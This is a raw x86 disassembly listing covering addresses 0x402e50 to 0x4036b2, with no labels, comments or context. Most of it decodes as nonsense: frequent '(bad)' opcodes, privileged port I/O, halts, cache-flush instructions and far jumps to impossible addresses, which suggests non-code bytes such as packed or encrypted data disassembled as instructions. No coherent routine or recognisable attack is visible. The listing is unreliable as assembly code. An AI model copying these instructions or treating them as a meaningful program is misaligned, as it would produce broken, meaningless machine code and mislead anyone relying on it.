  402e50:	int    0x7
  402e52:	or     eax,DWORD PTR [ecx]
  402e54:	cld    
  402e55:	loope  0x402e21
  402e57:	add    al,al
  402e59:	iret   
  402e5a:	retf   0x2
  402e5d:	shl    BYTE PTR [esi-0x3a49101e],0xb5
  402e64:	lock sar al,1
  402e67:	fmulp  st(4),st
  402e69:	cmc    
  402e6a:	std    
  402e6b:	add    esi,DWORD PTR [eax-0x21fd4526]
  402e71:	shl    ebp,1
  402e73:	or     al,ch
  402e75:	sti    
  402e76:	pop    es
  402e77:	add    bh,cl
  402e79:	or     eax,0xd8c8f8e9
  402e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e7f:	jecxz  0x402e56
  402e81:	(bad)
  402e84:	out    dx,al
  402e85:	out    0xd1,eax
  402e87:	mov    al,0xc4
  402e89:	(bad)  
  402e8b:	out    dx,eax
  402e8c:	icebp  
  402e8d:	iret   
  402e8e:	jecxz  0x402e72
  402e90:	fild   WORD PTR [esi]
  402e92:	out    0xd7,al
  402e94:	loope  0x402e67
  402e96:	in     eax,0xfe
  402e98:	loopne 0x402e83
  402e9a:	jmp    0xf2d1:0xe2df00cb
  402ea1:	scas   al,BYTE PTR es:[edi]
  402ea2:	fsubr  QWORD PTR [ecx+eiz*8-0x1507294b]
  402ea9:	vpmaxsw xmm3,xmm5,xmm3
  402ead:	inc    DWORD PTR [eax]
  402eaf:	repnz sar BYTE PTR [ebp-0x2704fb03],0xfc
  402eb7:	add    ebx,ecx
  402eb9:	retf   
  402eba:	add    cl,dl
  402ebc:	out    dx,eax
  402ebd:	(bad)
  402ec0:	into   
  402ec1:	mov    esp,0xb7e9f0cc
  402ec6:	xlat   BYTE PTR ds:[ebx]
  402ec7:	mov    edx,0xefffb3b0
  402ecc:	(bad)  
  402ecd:	xlat   BYTE PTR ds:[ebx]
  402ece:	div    edx
  402ed0:	shl    dh,0xd6
  402ed3:	sar    DWORD PTR [esp+eax*8+0x50de3ef],0xde
  402edb:	or     al,0xf
  402edd:	in     al,dx
  402ede:	fadd   st(7),st
  402ee0:	loop   0x402e8e
  402ee2:	lock in eax,0xb6
  402ee5:	(bad)  
  402ee6:	(bad)
  402ee9:	test   edi,0xfccfbdce
  402eef:	test   ecx,0xb8050bbc
  402ef5:	fmul   QWORD PTR [ebx]
  402ef7:	jecxz  0x402ee1
  402ef9:	cli    
  402efa:	jmp    0x402eda
  402efc:	cld    
  402efd:	scas   eax,DWORD PTR es:[edi]
  402efe:	icebp  
  402eff:	mov    esp,0xe4e7b6c5
  402f04:	out    dx,al
  402f05:	repz mov al,0xf9
  402f08:	mov    eax,0xd6d5f0f6
  402f0d:	ret    0xf7d5
  402f10:	out    0xc6,al
  402f12:	mov    esi,0xdbf7bce3
  402f17:	fdivr  st,st(4)
  402f19:	hlt    
  402f1a:	stc    
  402f1b:	fxam   
  402f1d:	int    0xd8
  402f1f:	lods   al,BYTE PTR ds:[esi]
  402f20:	mov    bh,0xef
  402f22:	xlat   BYTE PTR ds:[ebx]
  402f23:	mov    cl,0xf2
  402f25:	fchs   
  402f27:	mov    eax,0xd5d1f5ee
  402f2c:	aam    0xdc
  402f2e:	idiv   DWORD PTR [ebp-0x31afb39]
  402f34:	hlt    
  402f35:	in     al,0xfb
  402f37:	(bad)  
  402f38:	loope  0x402f2e
  402f3a:	(bad)  
  402f3c:	int    0xf3
  402f3e:	not    ecx
  402f40:	mov    cl,0xb2
  402f42:	div    DWORD PTR [edi-0x1374c34]
  402f48:	into   
  402f49:	(bad)  
  402f4b:	mov    edx,0xf3d9d5b4
  402f50:	out    0xc3,eax
  402f52:	(bad)  
  402f54:	cli    
  402f55:	add    ah,ah
  402f57:	enter  0xed09,0xe1
  402f5b:	jmp    0xafb0:0xd7becafa
  402f62:	out    dx,al
  402f63:	(bad)
  402f66:	jmp    0x402f3b
  402f68:	mov    bh,0xe4
  402f6a:	jecxz  0x402f27
  402f6c:	jmp    0xc2f0:0xede3ecbd
  402f73:	xlat   BYTE PTR ds:[ebx]
  402f74:	add    eax,0x7c9c5ca
  402f79:	fnclex 
  402f7b:	(bad)
  402f7e:	icebp  
  402f7f:	rol    al,1
  402f81:	aad    0xb7
  402f83:	icebp  
  402f84:	mov    al,0xba
  402f86:	fdiv   DWORD PTR [edi-0x26412626]
  402f8c:	aam    0xcd
  402f8e:	call   0xe4231c8d
  402f93:	add    edi,ecx
  402f95:	mov    BYTE PTR [edx],0xef
  402f98:	jecxz  0x402f9f
  402f9a:	in     eax,dx
  402f9b:	or     al,ah
  402f9d:	lods   al,BYTE PTR ds:[esi]
  402f9e:	(bad)  
  402f9f:	faddp  st(3),st
  402fa1:	shr    ebx,0xec
  402fa4:	ror    eax,cl
  402fa6:	loopne 0x402fa0
  402fa8:	jmp    0x402fa0
  402faa:	int3   
  402fab:	jmp    0xfcd2:0xfef3f3fa
  402fb2:	(bad)
  402fb5:	fcomi  st,st(5)
  402fb7:	xlat   BYTE PTR ds:[ebx]
  402fb8:	fucom  st(1)
  402fba:	fadd   QWORD PTR [edi]
  402fbc:	jmp    0x402f7a
  402fbe:	retf   0xeeb2
  402fc1:	mov    ch,0xd2
  402fc3:	out    dx,eax
  402fc4:	stc    
  402fc5:	(bad)  
  402fc7:	out    0xf8,al
  402fc9:	cld    
  402fca:	leave  
  402fcb:	in     eax,dx
  402fcc:	jmp    0xd1c0:0xcefdb8ff
  402fd3:	fild   WORD PTR [esp+edi*8]
  402fd6:	fadd   st,st(7)
  402fd8:	mov    DWORD PTR [ecx],0xeedacfe1
  402fde:	ffreep st(0)
  402fe0:	mov    cl,0xe6
  402fe2:	icebp  
  402fe3:	mov    bh,0xc9
  402fe5:	mov    bh,0xe8
  402fe7:	fsub   st,st(5)
  402fe9:	icebp  
  402fea:	mov    edx,0xf7daefe8
  402fef:	cld    
  402ff0:	shl    cl,cl
  402ff2:	(bad)  
  402ff4:	(bad)  
  402ff5:	fcmovb st,st(0)
  402ff7:	std    
  402ff8:	or     ebp,edx
  402ffa:	out    dx,eax
  402ffb:	std    
  402ffc:	(bad)  
  402ffd:	in     al,dx
  402ffe:	retf   
  402fff:	in     eax,0xe6
  403001:	lods   eax,DWORD PTR ds:[esi]
  403002:	repnz shr DWORD PTR [ebp+ecx*8-0x2531114b],0xe9
  40300b:	xlat   BYTE PTR ds:[ebx]
  40300c:	idiv   DWORD PTR [ebx-0xcfa213d]
  403012:	in     eax,0xd2
  403014:	(bad)  
  403016:	(bad)  
  403017:	mov    ebp,0x9fde7d9
  40301c:	out    dx,eax
  40301d:	in     eax,0xc8
  40301f:	shl    DWORD PTR [eax-0x321c4f1e],0xd1
  403026:	in     eax,dx
  403027:	cli    
  403028:	mov    bh,0xda
  40302a:	fdivr  st(0),st
  40302c:	jmp    0x390bf4
  403031:	lock ret 
  403033:	add    al,0xda
  403035:	fiadd  WORD PTR [edi+ebx*8]
  403038:	jmp    0x40301b
  40303a:	enter  0xdeea,0xa9
  40303e:	out    dx,eax
  40303f:	rol    bh,0xe6
  403042:	out    0xf4,eax
  403044:	(bad)  
  403045:	mul    esi
  403047:	out    dx,eax
  403048:	cmc    
  403049:	ror    edx,1
  40304b:	aad    0xf8
  40304d:	mov    ebp,0xc6e3fdf2
  403052:	in     eax,0xdc
  403054:	mov    eax,0xfae0fbc7
  403059:	cld    
  40305a:	fadd   QWORD PTR ds:0xaecabeed
  403060:	loope  0x403022
  403062:	sti    
  403063:	lods   eax,DWORD PTR ds:[esi]
  403064:	ret    0xe7b5
  403067:	mov    ebx,0xfc03ffe6
  40306c:	add    edi,ecx
  40306e:	rcr    ecx,0x2
  403071:	add    dh,ah
  403073:	add    al,BYTE PTR [esi]
  403075:	cli    
  403076:	loope  0x40304e
  403078:	add    eax,0xfcdff8e8
  40307d:	(bad)  
  40307f:	ret    
  403080:	jmp    0xbbc8:0xd9e4b1e5
  403087:	jmp    0xe02a2983
  40308c:	repnz iret 
  40308e:	shl    ecx,0xf4
  403091:	aad    0xf0
  403093:	cmc    
  403094:	stc    
  403095:	out    0xe0,al
  403097:	fld    QWORD PTR [eax]
  403099:	in     al,dx
  40309a:	hlt    
  40309b:	fucomp st(5)
  40309d:	(bad)  
  40309f:	in     eax,0xd6
  4030a1:	aad    0xe1
  4030a3:	mov    ch,0xf9
  4030a5:	mov    dh,0xcb
  4030a7:	fdivr  st,st(5)
  4030a9:	in     eax,dx
  4030aa:	retf   
  4030ab:	aam    0xbf
  4030ad:	cli    
  4030ae:	std    
  4030af:	add    ebp,edx
  4030b1:	std    
  4030b2:	fcomi  st,st(2)
  4030b4:	xlat   BYTE PTR ds:[ebx]
  4030b5:	add    DWORD PTR [ecx+eiz*8],eax
  4030b8:	mov    esp,0xd8ead8dc
  4030bd:	mov    ecx,0xedceb7e0
  4030c2:	out    0xf6,eax
  4030c4:	int3   
  4030c5:	retf   0xfbce
  4030c8:	(bad)  
  4030c9:	in     al,dx
  4030ca:	enter  0xdaf0,0xda
  4030ce:	in     eax,dx
  4030cf:	mov    esp,0xd4fcfdd7
  4030d4:	fadd   QWORD PTR [ecx]
  4030d6:	add    al,BYTE PTR ds:0xfe0f4e9
  4030dc:	in     al,dx
  4030dd:	out    0xd3,al
  4030df:	jecxz  0x4030c7
  4030e1:	in     al,dx
  4030e2:	shr    dl,1
  4030e4:	repz idiv DWORD PTR [eax-0x310b2439]
  4030eb:	mov    ebp,0x2d1dbcc
  4030f0:	(bad)  
  4030f1:	aad    0xd5
  4030f3:	repnz loop 0x4030df
  4030f6:	or     eax,esi
  4030f8:	jmp    0xe34d25d9
  4030fd:	retf   
  4030fe:	retf   0xc5c4
  403101:	mov    cl,0xeb
  403103:	bnd jmp 0xecf627bf
  403109:	imul   al
  40310b:	leave  
  40310c:	mov    ebx,0xf0f8d3f0
  403111:	ret    0xd6f5
  403114:	jmp    0xffff:0x3fef0d5
  40311b:	int    0xf
  40311d:	rcl    bl,0xde
  403120:	loopne 0x4030d0
  403122:	in     eax,dx
  403123:	lods   eax,DWORD PTR ds:[esi]
  403124:	sar    BYTE PTR [edx-0xe0a0f01],cl
  40312a:	mov    esp,0xf803d1ca
  40312f:	hlt    
  403130:	ret    
  403131:	aad    0xec
  403133:	add    bh,BYTE PTR [ebp+eax*1+0x1f4d5e1]
  40313a:	or     dl,bh
  40313c:	into   
  40313d:	mov    esp,0xd0d7c8a8
  403142:	shl    BYTE PTR [eax-0x441b350f],cl
  403148:	lock repnz shr bh,cl
  40314c:	int    0xd4
  40314e:	shl    edx,1
  403150:	mov    eax,0xf9ebbed4
  403155:	sti    
  403156:	fmulp  st(2),st
  403158:	clc    
  403159:	or     al,0x7
  40315b:	or     al,0xd8
  40315d:	out    dx,eax
  40315e:	out    0xec,al
  403160:	(bad)  
  403161:	fsub   st(5),st
  403163:	retf   
  403164:	(bad)  
  403165:	cli    
  403166:	aam    0xf8
  403168:	repnz jmp 0xd7d6:0xffecf2cf
  403170:	out    0xbb,eax
  403172:	idiv   bh
  403174:	mul    ah
  403176:	stc    
  403177:	or     dl,ch
  403179:	or     bl,bl
  40317b:	or     eax,0xcdf7a80b
  403180:	imul   ebx
  403182:	(bad)  
  403183:	mov    dl,0xe7
  403185:	icebp  
  403186:	in     al,0xcd
  403188:	iret   
  403189:	mov    bl,0xbd
  40318b:	add    edx,ebx
  40318d:	(bad)  
  40318f:	int3   
  403190:	in     eax,0xc6
  403192:	add    ebx,eax
  403194:	icebp  
  403195:	mov    DWORD PTR [ecx],0xe6fde6f5
  40319b:	enter  0xd203,0xa6
  40319f:	iret   
  4031a0:	(bad)  
  4031a1:	lock not edi
  4031a4:	mov    al,0xc6
  4031a6:	idiv   ebx
  4031a8:	fcmovnu st,st(4)
  4031aa:	mov    ch,0xcf
  4031ac:	test   BYTE PTR [ecx],0xdb
  4031af:	into   
  4031b0:	out    0xf6,eax
  4031b2:	mov    ebp,0xe3fdd4c0
  4031b7:	(bad)  
  4031b8:	in     eax,dx
  4031b9:	int    0xcd
  4031bb:	add    al,bl
  4031bd:	iret   
  4031be:	leave  
  4031bf:	fsubr  QWORD PTR [eax-0x4f0f2b2b]
  4031c5:	clc    
  4031c6:	enter  0xacd8,0xe8
  4031ca:	jmp    0x403187
  4031cc:	ret    0xeff2
  4031cf:	add    dl,bh
  4031d1:	hlt    
  4031d2:	mov    edx,0xc8c700c1
  4031d7:	(bad)  
  4031d8:	add    DWORD PTR ds:0xbf0613ee,eax
  4031de:	ffree  st(2)
  4031e0:	jmp    0x4031b9
  4031e2:	int3   
  4031e3:	xlat   BYTE PTR ds:[ebx]
  4031e4:	leave  
  4031e5:	(bad)  
  4031e6:	loopne 0x4031b6
  4031e8:	xlat   BYTE PTR ds:[ebx]
  4031e9:	(bad)  
  4031ea:	mov    eax,0x7facdce
  4031ef:	out    dx,al
  4031f0:	cld    
  4031f1:	clc    
  4031f2:	loop   0x4031d1
  4031f4:	mov    esp,0xf607cb08
  4031f9:	out    0xef,eax
  4031fb:	push   cs
  4031fc:	(bad)  
  4031fd:	out    dx,al
  4031fe:	in     eax,0xc6
  403200:	shr    cl,cl
  403202:	int3   
  403203:	(bad)  
  403204:	ret    0xb0cf
  403207:	aam    0xd4
  403209:	out    dx,al
  40320a:	cmc    
  40320b:	mov    ah,0xc3
  40320d:	add    dh,cl
  40320f:	shl    bh,0xd4
  403212:	add    al,0xea
  403214:	add    edi,edi
  403216:	add    eax,0xe804dbfc
  40321b:	add    al,0xc
  40321d:	mov    eax,0xeecdeab2
  403222:	out    dx,eax
  403223:	retf   0xafd0
  403226:	leave  
  403227:	aad    0xd6
  403229:	xlat   BYTE PTR ds:[ebx]
  40322a:	int    0xdd
  40322c:	imul   eax
  40322e:	sti    
  40322f:	ret    
  403230:	in     al,dx
  403231:	inc    BYTE PTR ds:0xc6f7b80b
  403237:	out    0xf,eax
  403239:	add    al,0xd
  40323b:	(bad)  
  40323c:	out    dx,eax
  40323d:	stos   BYTE PTR es:[edi],al
  40323e:	iret   
  40323f:	mov    al,0xbe
  403241:	scas   eax,DWORD PTR es:[edi]
  403242:	ret    
  403243:	hlt    
  403244:	out    0xe8,al
  403246:	leave  
  403247:	hlt    
  403248:	sti    
  403249:	out    dx,eax
  40324a:	cld    
  40324b:	aad    0xb0
  40324d:	mov    edi,0xc2f7d4fb
  403252:	fld    st(5)
  403254:	(bad)  
  403256:	add    al,ah
  403258:	loopne 0x40321f
  40325a:	fsubp  st(3),st
  40325c:	in     eax,0xcd
  40325e:	repnz mov esi,0xe3cac8b1
  403264:	mov    ah,0xdb
  403266:	enter  0xbaf0,0xd7
  40326a:	out    dx,al
  40326b:	mov    ch,0xb9
  40326d:	mov    ebp,0xf3e701b8
  403272:	push   ebp
  403274:	add    DWORD PTR [edi-0x191f35fc],edi
  40327a:	fcmovu st,st(4)
  40327c:	in     eax,dx
  40327d:	out    0xc5,eax
  40327f:	xlat   BYTE PTR ds:[ebx]
  403280:	call   0xe10d2368
  403285:	shr    cl,1
  403287:	repnz (bad) 
  403289:	mov    ah,0xc9
  40328b:	xlat   BYTE PTR ds:[ebx]
  40328c:	mov    esp,0xfbfaddec
  403291:	xlat   BYTE PTR ds:[ebx]
  403292:	push   es
  403293:	lock (bad) 
  403295:	(bad)
  403298:	fild   DWORD PTR [eax*8-0xc3d1fff]
  40329f:	int3   
  4032a0:	in     eax,dx
  4032a1:	int    0xdc
  4032a3:	iret   
  4032a4:	mov    ch,0xe9
  4032a6:	int    0xb0
  4032a8:	(bad)  
  4032a9:	sti    
  4032aa:	hlt    
  4032ab:	jmp    0x6f1:0xdaedeeef
  4032b2:	loop   0x403278
  4032b4:	add    eax,0xc6dbc506
  4032b9:	fiadd  DWORD PTR [esi]
  4032bb:	jmp    0xaf00fea4
  4032c0:	mov    dh,0xc4
  4032c2:	leave  
  4032c3:	jecxz  0x40329a
  4032c5:	lock (bad) 
  4032c7:	(bad)  
  4032c9:	mov    bh,0xb4
  4032cb:	fidivr DWORD PTR [esi-0x472bff41]
  4032d1:	xlat   BYTE PTR ds:[ebx]
  4032d2:	add    al,0xdc
  4032d4:	fscale 
  4032d6:	(bad)  
  4032d8:	or     ebp,edi
  4032da:	add    esi,edi
  4032dc:	in     eax,dx
  4032dd:	in     al,dx
  4032de:	test   al,0xed
  4032e0:	ror    esp,cl
  4032e2:	(bad)  
  4032e3:	leave  
  4032e4:	mov    ebx,0xcdd7fae9
  4032e9:	div    edx
  4032eb:	jmp    0x4032bc
  4032ed:	fcmovu st,st(1)
  4032ef:	mov    ch,0x2
  4032f1:	std    
  4032f2:	lock out 0xfa,eax
  4032f5:	(bad)  
  4032f6:	ror    BYTE PTR [esi],1
  4032f8:	pop    es
  4032f9:	(bad)  
  4032fa:	aam    0xf9
  4032fc:	jmp    0xe5bc:0xaea5eab9
  403303:	mov    ebx,0xb7d8afb6
  403308:	(bad)  
  403309:	ror    edi,1
  40330b:	std    
  40330c:	cli    
  40330d:	into   
  40330e:	jecxz  0x4032ee
  403310:	ret    0x2e2
  403313:	rol    BYTE PTR [ebx],0xe1
  403316:	jmp    0x403318
  403318:	invd   
  40331a:	push   es
  40331b:	add    ch,bh
  40331d:	rol    edi,1
  40331f:	int    0xbd
  403321:	aam    0xe8
  403323:	xlat   BYTE PTR ds:[ebx]
  403324:	icebp  
  403325:	mov    bh,0xe9
  403327:	icebp  
  403328:	mov    ah,0xed
  40332a:	cmc    
  40332b:	fmul   st,st(2)
  40332d:	out    dx,eax
  40332e:	sti    
  40332f:	fadd   st,st(3)
  403331:	pop    es
  403332:	shl    dh,0xfd
  403335:	cli    
  403336:	(bad)  
  403337:	retf   0xc6c6
  40333a:	clc    
  40333b:	(bad)  
  40333d:	stos   BYTE PTR es:[edi],al
  40333e:	ret    0xe0bf
  403341:	(bad)  
  403342:	vpsadbw xmm4,xmm5,xmm6
  403346:	iret   
  403347:	int    0xbe
  403349:	fmul   st(4),st
  40334b:	mov    esi,0xe6f4bb01
  403350:	loope  0x40332e
  403352:	in     eax,0xfc
  403354:	fdiv   st(5),st
  403356:	or     DWORD PTR [edi],eax
  403358:	wbinvd 
  40335a:	jmp    0xc7201844
  40335f:	mov    ebp,0xc0e5f3c0
  403364:	ret    0xbbb3
  403367:	(bad)  
  403369:	leave  
  40336a:	aad    0xb1
  40336c:	enter  0xd9f0,0x3
  403370:	out    0x7,al
  403372:	shl    eax,1
  403374:	jmp    0xee03:0xfcc0c8d6
  40337b:	add    dl,bh
  40337d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40337e:	jmp    0x403350
  403380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403381:	mov    dh,0xd1
  403383:	in     al,0xfb
  403385:	in     al,0xce
  403387:	jmp    0x403384
  403389:	clc    
  40338a:	mov    edx,0xd603ecf8
  40338f:	loopne 0x403364
  403391:	xlat   BYTE PTR ds:[ebx]
  403392:	mov    esp,0xd704cbf3
  403397:	retf   0xdc0b
  40339a:	loop   0x40339b
  40339c:	loopne 0x40334a
  40339e:	rcl    eax,0xe5
  4033a1:	out    0xf3,al
  4033a3:	loop   0x40335c
  4033a5:	(bad)  
  4033a6:	into   
  4033a7:	lock mov esi,0xf9d1b2d5
  4033ad:	int    0xe0
  4033af:	ret    
  4033b0:	out    0xd1,al
  4033b2:	jecxz  0x40337f
  4033b4:	xlat   BYTE PTR ds:[ebx]
  4033b5:	lock sti 
  4033b7:	(bad)  
  4033b9:	(bad)
  4033bc:	call   0xd2f3e1b0
  4033c1:	mov    dl,0xc4
  4033c3:	int3   
  4033c4:	call   0xedf60a9a
  4033c9:	lock fst st(7)
  4033cc:	sar    DWORD PTR [ebx-0x26061e2a],1
  4033d2:	sti    
  4033d3:	add    ecx,edx
  4033d5:	clc    
  4033d6:	out    dx,eax
  4033d7:	mov    ebp,0xbcafbfe
  4033dc:	jmp    edx
  4033de:	retf   
  4033df:	mov    ebp,0xe7ebc1d0
  4033e5:	in     eax,0xb2
  4033e7:	repz out 0xd0,al
  4033ea:	icebp  
  4033eb:	mov    edx,0xddd5bff7
  4033f0:	mov    esp,0xf8cbdaf0
  4033f5:	aam    0xf6
  4033f7:	mov    ebp,0xcee602e9
  4033fc:	out    0xd8,eax
  4033fe:	in     al,dx
  4033ff:	into   
  403400:	shl    BYTE PTR [ebp-0x1b14241e],cl
  403406:	out    0xba,eax
  403408:	stc    
  403409:	mov    ecx,0xc3f6d3f3
  40340e:	rcl    ebx,cl
  403410:	std    
  403411:	sar    dl,0xde
  403414:	add    esp,edx
  403416:	jmp    0x74a3bdc
  40341b:	cli    
  40341c:	fmul   st(2),st
  40341e:	xlat   BYTE PTR ds:[ebx]
  40341f:	loope  0x403416
  403421:	in     al,0xd3
  403423:	out    dx,eax
  403424:	mov    dh,0xf3
  403426:	in     eax,dx
  403427:	(bad)  
  403428:	lock enter 0xcdd4,0xc3
  40342d:	cld    
  40342e:	in     eax,dx
  40342f:	loopne 0x403411
  403431:	out    0xe2,al
  403433:	ffreep st(3)
  403435:	pop    es
  403436:	add    eax,0x20eeac8
  40343b:	add    cl,BYTE PTR [esi]
  40343d:	stos   DWORD PTR es:[edi],eax
  40343e:	loopne 0x4033fc
  403440:	mov    bh,0xac
  403442:	shl    cl,1
  403444:	jmp    0x40342c
  403446:	enter  0xffcd,0xb6
  40344a:	stc    
  40344b:	leave  
  40344c:	stc    
  40344d:	fbstp  TBYTE PTR [esi-0x72a27ff]
  403453:	jmp    0xe3eb:0xebe2c9c0
  40345a:	stc    
  40345b:	repnz into 
  40345d:	in     eax,0xf7
  40345f:	shl    BYTE PTR [edi-0x3e2d182c],cl
  403465:	jmp    0xcf250659
  40346a:	(bad)  
  40346c:	shl    eax,cl
  40346e:	mov    edx,0xfce1eed4
  403473:	repnz lds eax,FWORD PTR [edi]
  403476:	retf   
  403477:	(bad)  
  403478:	aam    0xe2
  40347a:	add    al,0x3
  40347c:	cli    
  40347d:	jecxz  0x403449
  40347f:	retf   0xbdf3
  403482:	shr    esp,cl
  403484:	loope  0x403452
  403486:	ror    al,1
  403488:	mov    eax,0xd802f7d0
  40348d:	lock add bh,ch
  403490:	sar    DWORD PTR [esi-0x1c1a1c2c],1
  403496:	out    0xdf,eax
  403498:	add    ch,cl
  40349a:	retf   
  40349b:	out    dx,al
  40349c:	in     eax,0xe8
  40349e:	mov    eax,0xb1acc4dd
  4034a3:	mov    cl,0xcb
  4034a5:	(bad)
  4034a8:	mov    ecx,0xfff5f1ba
  4034ad:	into   
  4034ae:	fld    st(1)
  4034b0:	clc    
  4034b1:	ret    0xddcc
  4034b4:	(bad)  
  4034b6:	stc    
  4034b7:	add    al,0xeb
  4034b9:	enter  0xdb13,0xdd
  4034bd:	lds    esi,FWORD PTR [eax-0x513a2c29]
  4034c3:	mov    ebx,0xb0c8cdcf
  4034c8:	aad    0xcd
  4034ca:	leave  
  4034cb:	aad    0xd3
  4034cd:	mov    eax,0xbdf6bfbd
  4034d2:	rol    ch,1
  4034d4:	shl    ah,cl
  4034d6:	ffreep st(5)
  4034d8:	out    0xcb,al
  4034da:	fmulp  st(5),st
  4034dc:	in     al,dx
  4034dd:	in     al,dx
  4034de:	(bad)  
  4034df:	test   eax,0xcdcfcdca
  4034e4:	lock mov al,0xdf
  4034e7:	sti    
  4034e8:	mov    al,0xf9
  4034ea:	fstp   st(2)
  4034ec:	icebp  
  4034ed:	mov    edx,0xfed7f9da
  4034f2:	add    ah,bh
  4034f4:	jmp    0x4034fc
  4034f6:	hlt    
  4034f7:	vpaddq xmm5,xmm0,xmm4
  4034fb:	dec    ah
  4034fd:	repnz mov esp,0xd3cbc9d1
  403503:	repz icebp 
  403505:	ror    bl,1
  403507:	cli    
  403508:	into   
  403509:	mov    ebx,0xfad0d1bc
  40350e:	mov    edi,0xfff0dcd2
  403513:	shl    ch,1
  403515:	sti    
  403516:	or     bh,ah
  403518:	in     eax,dx
  403519:	cli    
  40351a:	loop   0x40352e
  40351c:	cli    
  40351d:	sar    DWORD PTR [eax-0x350c3c20],0xe6
  403524:	mov    dh,0xd0
  403526:	fcmovbe st,st(7)
  403528:	in     eax,0xf9
  40352a:	into   
  40352b:	out    dx,al
  40352c:	leave  
  40352d:	add    edx,esi
  40352f:	pop    es
  403530:	(bad)  
  403532:	(bad)  
  403533:	fcmovnb st,st(1)
  403535:	cmc    
  403536:	inc    BYTE PTR ds:0xe5ea00e4
  40353c:	or     eax,0xe4a8a6be
  403541:	scas   al,BYTE PTR es:[edi]
  403542:	rcr    bl,0xba
  403545:	out    dx,al
  403546:	icebp  
  403547:	aam    0xdd
  403549:	out    dx,al
  40354a:	shr    ah,1
  40354c:	hlt    
  40354d:	cld    
  40354e:	rol    edi,1
  403550:	sar    BYTE PTR [esi-0x9070c39],cl
  403556:	or     ebp,esi
  403558:	out    0xe3,eax
  40355a:	int3   
  40355b:	loope  0x403549
  40355d:	loopne 0x403530
  40355f:	mov    al,0xcd
  403561:	shl    ch,0xe3
  403564:	mov    dh,0xeb
  403566:	jmp    0xbdb5:0xe4d5d4c7
  40356d:	hlt    
  40356e:	ret    
  40356f:	lock cld 
  403571:	jmp    ebx
  403573:	xlat   BYTE PTR ds:[ebx]
  403574:	fld    st(2)
  403576:	hlt    
  403577:	fld    DWORD PTR [ecx]
  403579:	ret    
  40357a:	inc    ebp
  40357c:	fsub   st,st(4)
  40357e:	rol    ah,cl
  403580:	test   al,0xec
  403582:	repnz cmc 
  403584:	iret   
  403585:	in     eax,dx
  403586:	jmp    0x40357b
  403588:	repz faddp st(4),st
  40358b:	mov    ah,0xcc
  40358d:	iret   
  40358e:	mov    esi,0xbe05d1fc
  403593:	cli    
  403594:	sar    ch,0xfe
  403597:	(bad)  
  403598:	add    edi,esp
  40359a:	add    al,0xc5
  40359c:	adc    cl,dh
  40359e:	out    dx,al
  40359f:	int3   
  4035a0:	out    0xc5,eax
  4035a2:	lods   al,BYTE PTR ds:[esi]
  4035a3:	loope  0x40356f
  4035a5:	shr    eax,cl
  4035a7:	(bad)  
  4035a8:	mov    bh,0xfb
  4035aa:	shr    bh,1
  4035ac:	in     eax,dx
  4035ad:	repz add cl,ch
  4035b0:	xlat   BYTE PTR ds:[ebx]
  4035b1:	rol    esp,cl
  4035b3:	in     al,0xe4
  4035b5:	(bad)  
  4035b6:	jecxz  0x40359b
  4035b8:	sti    
  4035b9:	hlt    
  4035ba:	add    al,0x0
  4035bc:	out    dx,al
  4035bd:	stos   DWORD PTR es:[edi],eax
  4035be:	(bad)  
  4035bf:	in     al,dx
  4035c0:	loopne 0x4035ab
  4035c2:	int3   
  4035c3:	div    cl
  4035c5:	in     al,dx
  4035c6:	aad    0xe4
  4035c8:	leave  
  4035c9:	shl    cl,cl
  4035cb:	sar    BYTE PTR [eax-0x31103727],cl
  4035d1:	shr    ebx,0xe6
  4035d4:	in     eax,0xeb
  4035d6:	or     ecx,eax
  4035d8:	std    
  4035d9:	fdiv   st,st(4)
  4035db:	or     al,0xfa
  4035dd:	loopne 0x40358c
  4035df:	shl    esi,0xd4
  4035e2:	call   0xf60516b9
  4035e7:	(bad)  
  4035e8:	(bad)  
  4035ea:	mov    esi,0xbecefbf3
  4035ef:	loopne 0x4035c6
  4035f1:	(bad)  
  4035f2:	sti    
  4035f3:	xlat   BYTE PTR ds:[ebx]
  4035f4:	fmul   st,st(2)
  4035f6:	jmp    0x103c1af8
  4035fb:	or     bl,ch
  4035fd:	retf   0xecef
  403600:	fsubp  st(5),st
  403602:	int3   
  403603:	(bad)  
  403604:	leave  
  403605:	shr    eax,1
  403607:	jmp    0x4035dc
  403609:	clc    
  40360a:	mov    eax,0xd1f9edcc
  40360f:	shr    ah,0xdf
  403612:	shl    dh,0xc2
  403615:	shl    dl,1
  403617:	fdivr  st,st(6)
  403619:	fucom  st(2)
  40361b:	adc    esi,edx
  40361d:	shl    eax,cl
  40361f:	(bad)  
  403621:	shr    BYTE PTR [ebp-0x5130122a],cl
  403627:	mov    dh,0xac
  403629:	not    bl
  40362b:	out    dx,al
  40362c:	mov    ecx,0xf5f5c2b8
  403631:	sti    
  403632:	int3   
  403633:	repz (bad) 
  403635:	cld    
  403636:	(bad)  
  403637:	sti    
  403638:	or     bl,bh
  40363a:	out    dx,al
  40363b:	std    
  40363c:	or     al,0xbf
  40363e:	jmp    0xf42824ef
  403643:	out    0xc6,eax
  403645:	repnz hlt 
  403647:	in     eax,dx
  403648:	int    0xed
  40364a:	neg    bl
  40364c:	(bad)  
  40364d:	mov    edx,0xf9fb0300
  403652:	in     al,0xe2
  403654:	out    0xe9,eax
  403656:	jecxz  0x403654
  403658:	fmul   st(5),st
  40365a:	adc    eax,ecx
  40365c:	cld    
  40365d:	mov    ebp,0xbdd6e8bd
  403662:	div    dh
  403664:	mov    cl,0xb4
  403666:	shr    DWORD PTR [ebp-0x47052d30],cl
  40366c:	loope  0x403649
  40366e:	add    ah,bl
  403670:	cld    
  403671:	fcmove st,st(4)
  403673:	rol    dl,cl
  403675:	xlat   BYTE PTR ds:[ebx]
  403676:	jmp    0x9ea:0x108000b
  40367d:	test   al,0xaa
  40367f:	icebp  
  403680:	retf   0xe3b2
  403683:	loope  0x403678
  403685:	into   
  403686:	stc    
  403687:	xlat   BYTE PTR ds:[ebx]
  403688:	jmp    0xd303f65a
  40368d:	rcr    dl,1
  40368f:	ret    
  403690:	mov    bl,0xbc
  403693:	fld    st(7)
  403695:	cli    
  403696:	enter  0xc909,0xce
  40369a:	add    bl,cl
  40369c:	jmp    0xb106014f
  4036a1:	retf   
  4036a2:	(bad)  
  4036a3:	call   0xb5f4e68f
  4036a8:	in     al,0xdc
  4036aa:	cld    
  4036ab:	mov    ebp,0xddc0d7cc
  4036b0:	add    al,BYTE PTR [edx]
  4036b2:	cli    
